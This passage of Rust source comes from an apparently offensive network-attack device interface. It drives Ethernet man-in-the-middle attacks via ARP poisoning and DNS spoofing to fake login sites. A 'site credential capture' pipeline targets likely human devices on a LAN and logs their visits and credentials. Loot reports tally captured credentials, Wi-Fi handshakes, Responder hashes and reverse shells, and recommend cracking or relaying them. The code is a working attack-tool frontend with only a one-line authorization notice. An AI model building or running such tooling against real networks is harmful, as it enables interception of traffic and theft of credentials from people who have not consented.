                // Cancel selected in two-item menu
                return Ok(());
            }
            if options.len() == 3 && choice == 2 {
                return Ok(());
            }

            let max_options = vec![
                ("Cap 8 hosts (safe)", 8usize),
                ("All hosts (no cap)", usize::MAX),
            ];
            let max_labels: Vec<String> = max_options
                .iter()
                .map(|(label, _)| label.to_string())
                .collect();
            let Some(max_choice) = self.choose_from_menu("Host Limit", &max_labels)? else {
                return Ok(());
            };
            let max_hosts = max_options.get(max_choice).map(|(_, v)| *v).unwrap_or(8);

            let loot_label = if !self.config.settings.target_network.is_empty() {
                self.config.settings.target_network.clone()
            } else {
                active_interface.clone()
            };

            let args = MitmStartArgs {
                interface: Some(active_interface.clone()),
                network: Some(loot_label.clone()),
                max_hosts,
                label: Some(loot_label.clone()),
            };
            let cmd = Commands::Mitm(MitmCommand::Start(args));

            self.show_progress(
                "Ethernet MITM",
                [
                    &format!("Iface: {}", active_interface),
                    &format!(
                        "Max hosts: {}",
                        if max_hosts == usize::MAX {
                            "all".to_string()
                        } else {
                            max_hosts.to_string()
                        }
                    ),
                ],
            )?;

            let result = self.dispatch_cancellable("Ethernet MITM", cmd, 30)?;
            let Some((msg, data)) = result else {
                let _ = self.core.dispatch(Commands::Mitm(MitmCommand::Stop));
                return Ok(());
            };

            let victim_count = data
                .get("victim_count")
                .and_then(|v| v.as_u64())
                .unwrap_or(0);
            let skipped = data
                .get("victims_skipped")
                .and_then(|v| v.as_u64())
                .unwrap_or(0);
            let pcap_path = data
                .get("pcap_path")
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            let loot_dir = data.get("loot_dir").and_then(|v| v.as_str()).unwrap_or("");
            let loot_dir_buf = if loot_dir.is_empty() {
                None
            } else {
                Some(PathBuf::from(loot_dir))
            };
            let gateway = data
                .get("gateway")
                .and_then(|v| v.as_str())
                .unwrap_or("gateway");

            let mut lines = vec![
                msg,
                format!("Iface: {}", active_interface),
                format!("Gateway: {}", gateway),
                format!("Victims: {}", victim_count),
            ];
            if skipped > 0 {
                lines.push(format!("Skipped: {}", skipped));
            }
            if let Some(ref dir) = loot_dir_buf {
                lines.push("Loot dir:".to_string());
                lines.push(shorten_for_display(dir.to_string_lossy().as_ref(), 18));
            }
            lines.push("PCAP:".to_string());
            lines.push(shorten_for_display(pcap_path, 18));

            self.show_message("MITM Running", lines)?;

            if start_dns {
                let site = self.choose_dnsspoof_site(&dns_sites)?;
                if let Some(site_name) = site {
                    let dns_args = DnsSpoofStartArgs {
                        site: site_name.clone(),
                        interface: Some(active_interface.clone()),
                        loot_dir: loot_dir_buf.clone(),
                    };
                    let dns_cmd = Commands::DnsSpoof(DnsSpoofCommand::Start(dns_args));
                    match self.core.dispatch(dns_cmd) {
                        Ok((dns_msg, dns_data)) => {
                            self.begin_mitm_session(Some(site_name.clone()), loot_dir_buf.clone());
                            let mut dns_lines = vec![
                                dns_msg,
                                format!("Site: {}", site_name),
                                format!("Iface: {}", active_interface),
                            ];
                            if let Some(ip) = dns_data.get("interface").and_then(|v| v.as_str()) {
                                dns_lines.push(format!("Bound: {}", ip));
                            }
                            self.show_message("DNS Spoof", dns_lines)?;
                            self.show_mitm_status()?;
                        }
                        Err(e) => {
                            self.show_message(
                                "DNS Spoof Error",
                                ["Failed to launch DNS spoof", &format!("{}", e)],
                            )?;
                        }
                    }
                }
            }
            Ok(())
        }
    }

    fn stop_ethernet_mitm(&mut self) -> Result<()> {
        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("Ethernet MITM", ["Available on Linux targets only"]);
        }

        #[cfg(target_os = "linux")]
        {
            let _ = self
                .core
                .dispatch(Commands::DnsSpoof(DnsSpoofCommand::Stop));
            match self.core.dispatch(Commands::Mitm(MitmCommand::Stop)) {
                Ok((msg, _)) => self.show_message("MITM Stopped", [msg, "IP forwarding disabled".to_string()]),
                Err(e) => self.show_message(
                    "MITM Stop Error",
                    ["Failed to stop MITM".to_string(), format!("{}", e)],
                ),
            }?;
            self.active_mitm = None;
            Ok(())
        }
    }

    fn launch_ethernet_site_cred_capture(&mut self) -> Result<()> {
        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("Site Cred Capture", ["Available on Linux targets only"]);
        }

        #[cfg(target_os = "linux")]
        {
            if !self.mode_allows_active("Site credential capture blocked in Stealth mode")? {
                return Ok(());
            }
            let active_interface = self.config.settings.active_network_interface.clone();
            if active_interface.is_empty() {
                return self.show_message(
                    "Site Cred Capture",
                    [
                        "No active interface set",
                        "",
                        "Set an Ethernet interface",
                        "as Active in Settings.",
                    ],
                );
            }

            if !self.is_ethernet_interface(&active_interface) {
                return self.show_message(
                    "Site Cred Capture",
                    [
                        &format!("Active iface: {}", active_interface),
                        "Not an Ethernet interface",
                        "",
                        "Set an Ethernet interface",
                        "as Active before starting.",
                    ],
                );
            }

            if !self.interface_has_carrier(&active_interface) {
                return self.show_message(
                    "Site Cred Capture",
                    [
                        &format!("Interface: {}", active_interface),
                        "Link is down / no cable",
                        "",
                        "Plug into a network and",
                        "try again.",
                    ],
                );
            }

            let dns_sites = self.list_dnsspoof_sites();
            if dns_sites.is_empty() {
                return self.show_message(
                    "DNS Spoof",
                    [
                        "No site templates found.",
                        "Add folders under",
                        "DNSSpoof/sites/<name>",
                        "with an index.php or HTML.",
                    ],
                );
            }

            self.show_message(
                "Site Cred Capture",
                [
                    "Pipeline: scan LAN, classify",
                    "human devices, ARP poison",
                    "them, start DNS spoof site,",
                    "and capture traffic to PCAP.",
                    "",
                    "Use only on authorized",
                    "networks.",
                ],
            )?;

            let site = match self.choose_dnsspoof_site(&dns_sites)? {
                Some(s) => s,
                None => return Ok(()),
            };

            let max_options = vec![
                ("Cap 6-8 likely humans", 8usize),
                ("All detected humans", usize::MAX),
            ];
            let max_labels: Vec<String> = max_options.iter().map(|(l, _)| l.to_string()).collect();
            let Some(max_choice) = self.choose_from_menu("Host Limit", &max_labels)? else {
                return Ok(());
            };
            let max_hosts = max_options.get(max_choice).map(|(_, v)| *v).unwrap_or(8);

            let confirm_options = vec![
                format!("Site: {}", site),
                format!("Iface: {}", active_interface),
                if max_hosts == usize::MAX {
                    "Hosts: all detected".to_string()
                } else {
                    format!("Hosts: up to {}", max_hosts)
                },
                "Start".to_string(),
                "Cancel".to_string(),
            ];
            let Some(choice) = self.choose_from_list("Start Pipeline?", &confirm_options)? else {
                return Ok(());
            };
            if choice == confirm_options.len().saturating_sub(1) {
                return Ok(());
            }
            if choice != confirm_options.len().saturating_sub(2) {
                return Ok(());
            }

            self.show_progress(
                "Site Cred Capture",
                ["Scanning + classifying...", "ARP poison + DNS spoof..."],
            )?;

            let args = EthernetSiteCredArgs {
                interface: Some(active_interface.clone()),
                target: None,
                site: site.clone(),
                max_hosts,
                timeout_ms: 800,
            };
            let cmd = Commands::Ethernet(EthernetCommand::SiteCredCapture(args));

            if let Some((msg, data)) = self.dispatch_cancellable("Site Cred Capture", cmd, 45)? {
                let victim_count = data
                    .get("victim_count")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(0);
                let victims: Vec<String> = data
                    .get("victims")
                    .and_then(|v| v.as_array())
                    .map(|arr| {
                        arr.iter()
                            .filter_map(|s| s.as_str().map(ToString::to_string))
                            .collect()
                    })
                    .unwrap_or_default();
                let pcap_path = data
                    .get("pcap_path")
                    .and_then(|v| v.as_str())
                    .unwrap_or("unknown");
                let loot_dir = data.get("loot_dir").and_then(|v| v.as_str()).unwrap_or("");
                let loot_dir_buf = if loot_dir.is_empty() {
                    None
                } else {
                    Some(PathBuf::from(loot_dir))
                };
                let skipped = data
                    .get("victims_skipped")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(0);

                let mut lines = vec![
                    msg,
                    format!("Site: {}", site),
                    format!("Iface: {}", active_interface),
                    format!("Victims: {}", victim_count),
                ];
                if skipped > 0 {
                    lines.push(format!("Skipped: {}", skipped));
                }
                if !victims.is_empty() {
                    let preview: Vec<String> = victims.iter().take(3).cloned().collect();
                    lines.push(format!("Targets: {}", preview.join(", ")));
                    if victims.len() > 3 {
                        lines.push(format!("+{} more", victims.len() - 3));
                    }
                }
                if let Some(ref dir) = loot_dir_buf {
                    lines.push("Loot dir:".to_string());
                    lines.push(shorten_for_display(dir.to_string_lossy().as_ref(), 18));
                }
                lines.push("PCAP:".to_string());
                lines.push(shorten_for_display(pcap_path, 18));
                lines.push("DNS spoof enabled".to_string());

                self.show_message("Pipeline Running", lines)?;
                let dns_base = data
                    .get("dns_capture_dir")
                    .and_then(|v| v.as_str())
                    .map(PathBuf::from)
                    .or(loot_dir_buf.clone());
                self.begin_mitm_session(Some(site), dns_base);
                self.show_mitm_status()?;
            }
            Ok(())
        }
    }

    fn list_dnsspoof_sites(&self) -> Vec<String> {
        let mut sites = Vec::new();
        let base = self.root.join("DNSSpoof").join("sites");
        if let Ok(entries) = fs::read_dir(base) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_dir() {
                    if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                        sites.push(name.to_string());
                    }
                }
            }
        }
        sites.sort();
        sites
    }

    fn begin_mitm_session(&mut self, site: Option<String>, base: Option<PathBuf>) {
        let base = base.unwrap_or_else(|| self.root.join("DNSSpoof").join("captures"));
        let (visit_log, cred_log) = if let Some(ref s) = site {
            (
                Some(base.join(s).join("visits.log")),
                Some(base.join(s).join("credentials.log")),
            )
        } else {
            (None, None)
        };
        self.active_mitm = Some(MitmSession {
            started: Instant::now(),
            site,
            visit_log,
            cred_log,
        });
    }

    fn show_mitm_status(&mut self) -> Result<()> {
        let session = match self.active_mitm.clone() {
            Some(s) if s.site.is_some() => s,
            _ => {
                return self.show_message(
                    "MITM Status",
                    [
                        "No active DNS spoof session.",
                        "Start MITM + DNS to track",
                        "visits and credentials.",
                    ],
                );
            }
        };

        let mut visits_prev = 0usize;
        let mut creds_prev = 0usize;

        loop {
            let elapsed_secs = session.started.elapsed().as_secs();
            let visits = session
                .visit_log
                .as_ref()
                .and_then(|p| count_lines(p).ok())
                .unwrap_or(0);
            let creds = session
                .cred_log
                .as_ref()
                .and_then(|p| count_lines(p).ok())
                .unwrap_or(0);

            let mut lines = vec![
                format!("Site: {}", session.site.clone().unwrap_or_default()),
                format!("Elapsed: {}s", elapsed_secs),
                format!("Visits: {}", visits),
                format!("Creds: {}", creds),
                "".to_string(),
                "Select=Stop  Back=Exit".to_string(),
            ];

            // Highlight new events
            if visits > visits_prev {
                lines.insert(2, "[+] New visit".to_string());
            }
            if creds > creds_prev {
                lines.insert(2, "[+] New credential".to_string());
            }
            visits_prev = visits;
            creds_prev = creds;

            self.display.draw_dialog(&lines, &self.stats.snapshot())?;

            // Wait with timeout so we can refresh counts
            if let Some(button) = self.buttons.try_read_timeout(Duration::from_millis(1000))? {
                match self.map_button(button) {
                    ButtonAction::Back => return Ok(()),
                    ButtonAction::Select => {
                        let _ = self.stop_ethernet_mitm();
                        return Ok(());
                    }
                    ButtonAction::MainMenu => {
                        self.menu_state.home();
                        return Ok(());
                    }
                    ButtonAction::Reboot => {
                        self.confirm_reboot()?;
                    }
                    _ => {}
                }
            }
        }
    }

    fn build_network_report(&mut self) -> Result<()> {
        let networks = self.collect_network_names();
        if networks.is_empty() {
            return self.show_message(
                "Reports",
                [
                    "No network loot found.",
                    "Run Ethernet/WiFi ops",
                    "then try again.",
                ],
            );
        }
        let Some(choice) = self.choose_from_menu("Pick Network", &networks)? else {
            return Ok(());
        };
        let network = &networks[choice];

        self.show_progress(
            "Reports",
            [
                &format!("Building report for {}", network),
                "Please wait...",
            ],
        )?;

        match self.generate_network_report(network) {
            Ok((path, preview)) => {
                self.show_message(
                    "Report Saved",
                    [
                        shorten_for_display(path.to_string_lossy().as_ref(), 18),
                        format!("Lines: {}", preview.len()),
                    ],
                )?;
                self.scrollable_text_viewer("Network Report", &preview, false)
            }
            Err(e) => {
                self.show_message("Report Error", ["Failed to build report", &format!("{e}")])
            }
        }
    }

    fn collect_network_names(&self) -> Vec<String> {
        let mut set: HashSet<String> = HashSet::new();
        let loot = self.root.join("loot");
        for name in ["Ethernet", "Wireless", "Reports"] {
            if let Ok(entries) = fs::read_dir(loot.join(name)) {
                for entry in entries.flatten() {
                    if entry.path().is_dir() {
                        if let Some(n) = entry.file_name().to_str() {
                            set.insert(n.to_string());
                        }
                    }
                }
            }
        }
        let mut list: Vec<String> = set.into_iter().collect();
        list.sort();
        list
    }

    fn format_system_time(ts: SystemTime) -> String {
        let dt: chrono::DateTime<Local> = ts.into();
        dt.format("%Y-%m-%d %H:%M:%S").to_string()
    }

    fn format_size_short(size: u64) -> String {
        if size < 1024 {
            format!("{}B", size)
        } else if size < 1024 * 1024 {
            format!("{:.1}KB", (size as f64) / 1024.0)
        } else {
            format!("{:.1}MB", (size as f64) / 1024.0 / 1024.0)
        }
    }

    fn safe_count_lines_limited(path: &Path, max_bytes: u64) -> Option<usize> {
        let meta = fs::metadata(path).ok()?;
        if meta.len() > max_bytes {
            return None;
        }
        let file = File::open(path).ok()?;
        let reader = BufReader::new(file);
        Some(reader.lines().flatten().count())
    }

    fn summarize_json_file(path: &Path, max_bytes: u64) -> Option<String> {
        let meta = fs::metadata(path).ok()?;
        if meta.len() > max_bytes {
            return Some("large json (skipped)".to_string());
        }
        let data = fs::read_to_string(path).ok()?;
        let value: Value = serde_json::from_str(&data).ok()?;
        match value {
            Value::Array(arr) => Some(format!("entries: {}", arr.len())),
            Value::Object(map) => {
                if let Some(arr) = map.get("devices").and_then(|v| v.as_array()) {
                    return Some(format!("devices: {}", arr.len()));
                }
                if let Some(arr) = map.get("networks").and_then(|v| v.as_array()) {
                    return Some(format!("networks: {}", arr.len()));
                }
                if let Some(ssid) = map.get("ssid").and_then(|v| v.as_str()) {
                    return Some(format!("ssid: {}", shorten_for_display(ssid, 12)));
                }
                let mut keys: Vec<String> = map.keys().take(3).cloned().collect();
                if map.len() > 3 {
                    keys.push(format!("+{} more", map.len() - 3));
                }
                if keys.is_empty() {
                    None
                } else {
                    Some(format!("keys: {}", keys.join(",")))
                }
            }
            _ => None,
        }
    }

    fn classify_artifact_kind(name_lower: &str, ext: Option<&str>) -> (String, bool) {
        match ext {
            Some("pcap") | Some("pcapng") | Some("cap") => return ("pcap".to_string(), true),
            Some("hccapx") => return ("handshake".to_string(), true),
            Some("json") => {
                if name_lower.contains("handshake") || name_lower.contains("pmkid") {
                    return ("handshake".to_string(), true);
                }
                return ("json".to_string(), false);
            }
            Some("log") => return ("log".to_string(), false),
            Some("txt") => return ("txt".to_string(), false),
            Some("gz") => {
                if name_lower.contains("pcap") {
                    return ("pcap".to_string(), true);
                }
            }
            _ => {}
        }
        if name_lower.contains("credentials") {
            return ("credentials".to_string(), true);
        }
        if name_lower.contains("visits") {
            return ("visits".to_string(), true);
        }
        if name_lower.contains("pipeline") {
            return ("pipeline".to_string(), true);
        }
        if name_lower.contains("capture") {
            return ("capture".to_string(), true);
        }
        ("file".to_string(), false)
    }

    fn extract_pipeline_run(base: &Path, path: &Path) -> Option<String> {
        let rel = path.strip_prefix(base).ok()?;
        let mut comps = rel.components().peekable();
        while let Some(c) = comps.next() {
            if let Component::Normal(name) = c {
                if name == "pipelines" {
                    if let Some(Component::Normal(run)) = comps.next() {
                        return run.to_str().map(|s| s.to_string());
                    }
                }
            }
        }
        None
    }

    fn build_artifact_item(base: &Path, path: &Path) -> Option<ArtifactItem> {
        let meta = fs::metadata(path).ok()?;
        if !meta.is_file() {
            return None;
        }
        let rel = path
            .strip_prefix(base)
            .unwrap_or(path)
            .display()
            .to_string();
        let size = meta.len();
        let modified = meta.modified().ok();
        let name_lower = path
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or_default()
            .to_ascii_lowercase();
        let ext = path
            .extension()
            .and_then(|e| e.to_str())
            .map(|s| s.to_ascii_lowercase());
        let (kind, mut important) = Self::classify_artifact_kind(&name_lower, ext.as_deref());
        let mut note = None;

        let pipeline_run = Self::extract_pipeline_run(base, path);
        if pipeline_run.is_some() {
            important = true;
        }

        match kind.as_str() {
            "credentials" => {
                if let Some(count) = Self::safe_count_lines_limited(path, 512 * 1024) {
                    note = Some(format!("entries: {}", count));
                }
                important = true;
            }
            "visits" => {
                if let Some(count) = Self::safe_count_lines_limited(path, 512 * 1024) {
                    note = Some(format!("visits: {}", count));
                }
                important = true;
            }
            "json" | "handshake" => {
                if let Some(summary) = Self::summarize_json_file(path, 512 * 1024) {
                    note = Some(summary);
                }
                if kind == "handshake" {
                    important = true;
                }
            }
            "pcap" | "capture" => {
                note = Some(format!("size {}", Self::format_size_short(size)));
                important = true;
            }
            _ => {
                if size == 0 {
                    note = Some("empty file".to_string());
                }
            }
        }

        Some(ArtifactItem {
            rel,
            kind,
            size,
            modified,
            note,
            important,
            pipeline_run,
        })
    }

    fn summarize_counts(counts: &HashMap<String, usize>) -> String {
        let mut parts: Vec<(String, usize)> = counts.iter().map(|(k, v)| (k.clone(), *v)).collect();
        parts.sort_by(|a, b| b.1.cmp(&a.1).then_with(|| a.0.cmp(&b.0)));
        parts
            .into_iter()
            .take(6)
            .map(|(k, v)| format!("{}:{}", k, v))
            .collect::<Vec<_>>()
            .join(", ")
    }

    fn format_pipeline_lines(&self, pipeline: &HashMap<String, PipelineStats>) -> Vec<String> {
        if pipeline.is_empty() {
            return Vec::new();
        }
        let mut runs: Vec<(&String, &PipelineStats)> = pipeline.iter().collect();
        runs.sort_by(|a, b| b.1.latest.cmp(&a.1.latest).then_with(|| b.0.cmp(a.0)));
        let mut lines = Vec::new();
        for (idx, (name, stats)) in runs.iter().enumerate() {
            let mut parts = Vec::new();
            if stats.captures > 0 {
                parts.push(format!("pcap:{}", stats.captures));
            }
            if stats.creds > 0 {
                parts.push(format!("creds:{}", stats.creds));
            }
            if stats.visits > 0 {
                parts.push(format!("visits:{}", stats.visits));
            }
            if stats.logs > 0 {
                parts.push(format!("logs:{}", stats.logs));
            }
            let detail = if parts.is_empty() {
                format!("files: {}", stats.files)
            } else {
                format!("files: {} ({})", stats.files, parts.join(", "))
            };
            let mut line = format!("Pipeline run {} - {}", name, detail);
            if let Some(ts) = stats.latest {
                line.push_str(&format!(" [{}]", Self::format_system_time(ts)));
            }
            lines.push(line);
            if idx >= 2 {
                break;
            }
        }
        if pipeline.len() > 3 {
            lines.push(format!(" +{} more pipeline run(s)", pipeline.len() - 3));
        }
        lines
    }

    fn format_artifact_details(
        &self,
        items: &[ArtifactItem],
        limit: usize,
        total: usize,
    ) -> (Vec<String>, usize) {
        if items.is_empty() {
            return (Vec::new(), 0);
        }
        let mut items = items.to_vec();
        items.sort_by(|a, b| match (b.modified, a.modified) {
            (Some(tb), Some(ta)) => tb.cmp(&ta),
            (Some(_), None) => std::cmp::Ordering::Less,
            (None, Some(_)) => std::cmp::Ordering::Greater,
            _ => b.rel.cmp(&a.rel),
        });
        let mut notable: Vec<ArtifactItem> =
            items.iter().cloned().filter(|i| i.important).collect();
        let mut others: Vec<ArtifactItem> =
            items.iter().cloned().filter(|i| !i.important).collect();
        let mut selected = Vec::new();
        if !notable.is_empty() {
            let take = notable.len().min(limit);
            selected.extend(notable.drain(..take));
        }
        if selected.len() < limit && !others.is_empty() {
            let needed = limit - selected.len();
            let take = others.len().min(needed);
            selected.extend(others.drain(..take));
        }
        let extra = total.saturating_sub(selected.len());
        let mut lines = Vec::new();
        for item in selected {
            let mut line = format!(" - {} [{}]", shorten_for_display(&item.rel, 26), item.kind);
            if let Some(ts) = item.modified {
                line.push_str(&format!(" {}", Self::format_system_time(ts)));
            }
            line.push_str(&format!(" {}", Self::format_size_short(item.size)));
            if let Some(note) = item.note {
                line.push_str(&format!(" ({})", shorten_for_display(&note, 24)));
            }
            lines.push(line);
        }
        (lines, extra)
    }

    fn traverse_loot_dir(&self, base: &Path, limit: usize) -> TraversalResult {
        let mut result = TraversalResult::default();
        if !base.exists() {
            return result;
        }
        for entry in WalkDir::new(base).into_iter() {
            let entry = match entry {
                Ok(e) => e,
                Err(e) => {
                    result.errors.push(e.to_string());
                    continue;
                }
            };
            let path = entry.path();
            if path.is_dir() {
                continue;
            }
            if let Some(item) = Self::build_artifact_item(base, path) {
                result.total_files += 1;
                *result.counts.entry(item.kind.clone()).or_insert(0) += 1;
                if let Some(run) = item.pipeline_run.as_ref() {
                    let stats = result.pipeline.entry(run.clone()).or_default();
                    stats.files += 1;
                    match item.kind.as_str() {
                        "pcap" | "capture" => stats.captures += 1,
                        "credentials" => stats.creds += 1,
                        "visits" => stats.visits += 1,
                        "log" => stats.logs += 1,
                        _ => {}
                    }
                    if let Some(ts) = item.modified {
                        stats.latest = match stats.latest {
                            Some(existing) => Some(existing.max(ts)),
                            None => Some(ts),
                        };
                    }
                }
                result.items.push(item);
            }
        }
        if result.items.len() > limit * 3 {
            // Keep memory bounded on very large trees
            result.items.truncate(limit * 3);
        }
        result
    }

    fn service_risk_notes(
        &self,
        ports: &std::collections::HashSet<u16>,
        banners: &[String],
    ) -> Vec<String> {
        let mut notes = Vec::new();
        let contains = |p: u16| ports.contains(&p);
        if contains(23) {
            notes.push("Telnet open (port 23) – cleartext management".to_string());
        }
        if contains(21) {
            notes.push("FTP open (port 21) – cleartext file transfer".to_string());
        }
        if contains(445) || contains(139) {
            notes.push("SMB/Windows file sharing exposed; lateral movement risk".to_string());
        }
        if contains(9100) || contains(515) || contains(631) {
            notes.push("Printer services detected; potential print spooler abuse".to_string());
        }
        if contains(2049) || contains(111) {
            notes.push("NFS/RPC exposed; check for anonymous exports".to_string());
        }
        if contains(548) || contains(445) {
            notes.push("NAS/file services present; audit shares and access controls".to_string());
        }
        if contains(3389) {
            notes.push("RDP open; enforce strong auth and lockouts".to_string());
        }
        if contains(80) && contains(443) && contains(8080) {
            notes.push("Multiple web ports; check for management panels".to_string());
        }
        let banner_hits: Vec<String> = banners
            .iter()
            .filter_map(|b| {
                let lower = b.to_ascii_lowercase();
                if lower.contains("printer") || lower.contains("jetdirect") {
                    Some("Banner hints printer hardware".to_string())
                } else if lower.contains("nas") || lower.contains("smb") {
                    Some("Banner indicates NAS/file server".to_string())
                } else if lower.contains("camera") || lower.contains("dvr") {
                    Some("Banner suggests camera/DVR device".to_string())
                } else {
                    None
                }
            })
            .collect();
        notes.extend(banner_hits);
        notes
    }

    fn append_artifact_section(
        &self,
        label: &str,
        dir: &Path,
        lines: &mut Vec<String>,
        insights: &mut Vec<String>,
        next_steps: &mut Vec<String>,
    ) {
        lines.push(label.to_string());
        if !dir.exists() {
            lines.push("No artifacts found here.".to_string());
            next_steps.push("Collect loot for this network to populate reports.".to_string());
            lines.push(String::new());
            return;
        }
        let traversal = self.traverse_loot_dir(dir, 12);
        if traversal.total_files == 0 {
            lines.push("Artifacts directory is empty.".to_string());
            next_steps.push("Run captures/scans to generate loot for this network.".to_string());
            lines.push(String::new());
            return;
        }
        let counts = Self::summarize_counts(&traversal.counts);
        let mut header = format!("Files: {}", traversal.total_files);
        if !counts.is_empty() {
            header.push_str(&format!(" ({})", counts));
        }
        lines.push(header);

        let pipeline_lines = self.format_pipeline_lines(&traversal.pipeline);
        if !pipeline_lines.is_empty() {
            lines.extend(pipeline_lines.clone());
            insights.push("Pipeline runs recorded; review artifacts for each run.".to_string());
        }

        let (detail_lines, extra) =
            self.format_artifact_details(&traversal.items, 12, traversal.total_files);
        if detail_lines.is_empty() {
            lines.push("No files could be summarized.".to_string());
        } else {
            lines.extend(detail_lines);
        }
        if extra > 0 {
            lines.push(format!(" +{} more file(s) not listed", extra));
        }
        if !traversal.errors.is_empty() {
            lines.push(format!(
                "Skipped {} item(s) due to read errors",
                traversal.errors.len()
            ));
        }
        lines.push(String::new());
    }

    fn generate_network_report(&self, network: &str) -> Result<(PathBuf, Vec<String>)> {
        let reports_dir = self.root.join("loot").join("Reports").join(network);
        fs::create_dir_all(&reports_dir).ok();
        let timestamp = Local::now().format("%Y-%m-%d_%H-%M-%S").to_string();
        let path = reports_dir.join(format!("report_{timestamp}.txt"));

        let mut lines = Vec::new();
        let mut insights = Vec::new();
        let mut next_steps = Vec::new();
        lines.push(format!("Network Report: {}", network));
        lines.push(format!("Generated: {}", timestamp));
        lines.push(String::new());

        let eth_dir = self.root.join("loot").join("Ethernet").join(network);
        self.append_eth_report(
            network,
            &eth_dir,
            &mut lines,
            &mut insights,
            &mut next_steps,
        );

        let wifi_dir = self.root.join("loot").join("Wireless").join(network);
        self.append_wifi_report(&wifi_dir, &mut lines, &mut insights, &mut next_steps);

        self.append_mac_usage(network, &mut lines, &mut insights, &mut next_steps);

        self.append_combined_impact(
            network,
            &eth_dir,
            &wifi_dir,
            &mut lines,
            &mut insights,
            &mut next_steps,
        );

        if !insights.is_empty() || !next_steps.is_empty() {
            lines.push("[Insights]".to_string());
            if insights.is_empty() {
                lines.push("No notable findings captured.".to_string());
            } else {
                lines.extend(insights.clone());
            }
            lines.push(String::new());
            lines.push("[Next Steps]".to_string());
            if next_steps.is_empty() {
                lines.push("Consider deeper scanning or credential capture.".to_string());
            } else {
                lines.extend(next_steps.clone());
            }
        }

        fs::write(&path, lines.join("\n"))
            .with_context(|| format!("writing {}", path.display()))?;
        Ok((path, lines))
    }

    fn append_eth_report(
        &self,
        network: &str,
        eth_dir: &Path,
        lines: &mut Vec<String>,
        insights: &mut Vec<String>,
        next_steps: &mut Vec<String>,
    ) {
        lines.push("[Ethernet]".to_string());
        if !eth_dir.exists() {
            lines.push("No Ethernet loot for this network.".to_string());
            lines.push(String::new());
            next_steps.push("Run Ethernet discovery/inventory to profile wired hosts.".to_string());
            return;
        }

        let mut collected_ports: std::collections::HashSet<u16> = std::collections::HashSet::new();
        let mut collected_banners: Vec<String> = Vec::new();

        // Inventory
        match self.read_inventory_summary(eth_dir) {
            Ok(Some((count, samples))) => {
                lines.push(format!("Inventory devices: {}", count));
                for s in samples {
                    lines.push(format!(" - {}", s));
                }
                if count == 0 {
                    next_steps.push(
                        "Inventory empty; run Device Inventory to profile hosts.".to_string(),
                    );
                }
            }
            Ok(None) => {
                lines.push("Inventory: none found".to_string());
                next_steps
                    .push("Inventory missing; run Device Inventory on this network.".to_string());
            }
            Err(e) => lines.push(format!(
                "Inventory read error: {}",
                shorten_for_display(&e.to_string(), 24)
            )),
        }

        // Port scans
        let port_lines = self.summarize_port_scans(network, eth_dir);
        if port_lines.is_empty() {
            lines.push("Port scans: none found".to_string());
            next_steps.push("Perform a port scan on key hosts to discover services.".to_string());
        } else {
            lines.extend(port_lines);
        }
        // Collect ports/banners for risk analysis
        let portscan_candidates = self.collect_portscan_candidates(network, eth_dir);
        for path in portscan_candidates.iter().take(4) {
            if let Ok((ports, banners)) = self.parse_portscan_file(path) {
                for p in ports {
                    collected_ports.insert(p);
                }
                for b in banners {
                    collected_banners.push(b);
                }
            }
        }

        // Discovery snapshots
        let discovery = self.summarize_discovery(network, eth_dir);
        if discovery.is_empty() {
            lines.push("Discovery: none found".to_string());
            next_steps.push("Run LAN discovery to map active hosts.".to_string());
        } else {
            lines.extend(discovery);
        }

        // MITM / DNS spoof
        let mitm = self.summarize_mitm(eth_dir);
        lines.extend(mitm.clone());
        if mitm
            .iter()
            .any(|l| l.contains("PCAPs:") || l.contains("Credentials:"))
        {
            insights.push(
                "Active MITM/DNS spoof activity recorded; artifacts may reveal testing footprint."
                    .to_string(),
            );
        }

        // Credential/visit summary
        let cred_lines = self.summarize_credentials(eth_dir);
        if cred_lines.is_empty() {
            lines.push("DNS spoof creds: none recorded".to_string());
            next_steps.push("Run MITM/DNS spoof to collect credentials or visits.".to_string());
        } else {
            lines.extend(cred_lines.clone());
            insights.push("Credentials/visit artifacts present; review carefully.".to_string());
        }

        // Service risk hints
        if !collected_ports.is_empty() || !collected_banners.is_empty() {
            let risks = self.service_risk_notes(&collected_ports, &collected_banners);
            if !risks.is_empty() {
                lines.push("Service insights:".to_string());
                lines.extend(risks.iter().take(4).map(|r| format!(" - {}", r)));
                if risks.len() > 4 {
                    lines.push(format!(" +{} more service hints", risks.len() - 4));
                }
                insights.push("Service fingerprints suggest potential weak points.".to_string());
            }
        }

        self.append_artifact_section("Ethernet loot sweep", eth_dir, lines, insights, next_steps);
    }

    fn append_wifi_report(
        &self,
        wifi_dir: &Path,
        lines: &mut Vec<String>,
        insights: &mut Vec<String>,
        next_steps: &mut Vec<String>,
    ) {
        lines.push("[Wireless]".to_string());
        if !wifi_dir.exists() {
            lines.push("No wireless loot for this network.".to_string());
            next_steps.push("Collect wireless captures/handshakes for this network.".to_string());
            return;
        }

        // Responder/DNS spoof/reverse shell context
        let responder_logs = self.root.join("Responder").join("logs");
        let dnsspoof_caps = self.root.join("DNSSpoof").join("captures");
        let responder_present = dir_has_files(&responder_logs);
        let dnsspoof_present = dir_has_files(&dnsspoof_caps);
        let (reverse_shells, bridge_events, payload_samples) = self.summarize_payload_activity();
        let bridge_pcaps = self.count_bridge_pcaps();

        let handshake_count = self.count_handshake_files(wifi_dir);
        if handshake_count > 0 {
            lines.push(format!("Captures: {} file(s)", handshake_count));
            insights.push(format!(
                "Wireless captures present ({} files).",
                handshake_count
            ));
        } else {
            lines.push("Captures: none found".to_string());
            next_steps.push("Attempt handshake/PMKID capture to obtain credentials.".to_string());
        }

        // Responder loot summary
        if responder_present {
            lines.push("Responder loot present".to_string());
            insights.push("Responder/hash capture available; attempt cracking/relay.".to_string());
            next_steps.push("Review Responder/logs for captured hashes/creds.".to_string());
        }

        // DNS spoof captures
        if dnsspoof_present {
            lines.push("DNS spoof captures present".to_string());
            insights.push("Portal activity recorded; check visits/credentials.".to_string());
            next_steps.push("Inspect DNSSpoof/captures for creds/visits.".to_string());
        }

        // Payload-driven actions (reverse shells, bridges)
        if reverse_shells > 0 || bridge_events > 0 || bridge_pcaps > 0 {
